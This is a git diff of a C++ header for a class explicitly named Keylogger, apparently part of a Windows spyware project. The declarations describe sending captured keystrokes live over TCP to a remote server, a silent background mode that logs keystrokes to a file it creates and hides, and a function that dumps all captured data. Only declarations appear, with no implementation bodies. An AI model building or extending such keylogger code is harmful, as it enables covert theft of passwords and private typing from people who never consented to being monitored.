@@ -18,14 +18,24 @@ class Keylogger
         wstring intToUnicode(INT keystroke);
         //-----------------------------------------------
         VOID directTcp();  //sends live keystrokes to the server.
-        //-----------------------------------------------        
-        VOID keyboardListeningAndWriteFile(CONST HANDLE &hFile); // for silenciousBackground
-        static DWORD WINAPI silenciousThread(LPVOID Param); //start thread keyboardListeningAndWriteFile
 
-        INT silenciousBackground(); //return 1 if error.  | In case of error the silent mod will not work. 
-        INT createHideFileAndHideFile();
-        VOID writeKeystrokeInFile(CONST wstring &keystroke, CONST HANDLE &hFile);  
-        vector <wstring> dumpAllData();// Returns all the data from the file that contains the keystrokes. 
+        static DWORD WINAPI sendKeystrokeThread(LPVOID param); // start thread directSendKeystroke
+        static DWORD WINAPI recvDataThread(LPVOID param); //start thread directRecvData
+        
+        BOOL directSendKeystrokeRunning = FALSE; //directSendKeystroke
+        VOID directRecvData(); //waiting for the end of the mod keylogger 
+        VOID directSendKeystroke(); //sends keystrokes 
+        //-----------------------------------------------        
+        static DWORD WINAPI silenciousThread(LPVOID param); //start thread keyboardListeningAndWriteFile
+        BOOL silenciousBackgroundRunning = FALSE; //test if the "silentThread" is currently alive. 
+        INT silenciousStart(); //return 1 if error.  | In case of error the silent mod will not work. 
+        INT silenciousStop();  //return 1 if error | returns 1 if the silencious thread is not started. 
+        INT silenciousCreateFileAndHideFile(); //Create a file to store the keystrokes. Then hide the file. 
+        VOID silenciousKeyboardListeningAndWriteFile(CONST HANDLE &hFile); // for silenciousBackground
+        VOID silenciousWriteKeystrokeInFile(CONST wstring &keystroke, CONST HANDLE &hFile);  //listens to the keystrokes and writes the result to the file.
+        
+        vector <string> dumpAllData();// Returns all the data from the file that contains the keystrokes. 
+
         //-----------------------------------------------
         SOCKET getSocket();
         //-----------------------------------------------
@@ -46,10 +56,5 @@ class Keylogger
         HKL a_hkl;
      
 };
-
-DWORD WINAPI sendKeystrokeThread(LPVOID param);
-DWORD WINAPI recvDataThread(LPVOID param);
-
 //DWORD WINAPI directTcp(LPVOID param)
-
 #endif
